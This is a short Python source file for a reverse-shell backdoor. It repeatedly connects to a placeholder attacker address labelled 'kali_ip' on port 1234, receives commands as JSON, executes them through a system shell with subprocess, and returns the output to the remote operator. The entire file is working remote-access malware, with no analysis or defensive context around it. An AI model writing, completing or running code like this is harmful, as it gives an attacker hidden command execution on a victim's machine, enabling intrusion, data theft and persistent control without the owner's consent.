import socket
import time
import json
import subprocess


kali_ip = '<server ip>'
port = 1234


def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            bites_qty = 1024  # amount of bites we want to receive
            data = data + sock.recv(bites_qty).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def connection():
    while True:
        time.sleep(20)
        try:
            sock.connect((kali_ip, port))
            shell()
            sock.close()
            break
        except:
            connection()


def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)


# socket.AF_INET implies ipv4 connection
# socket.SOCK_STREAM implies tcp connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
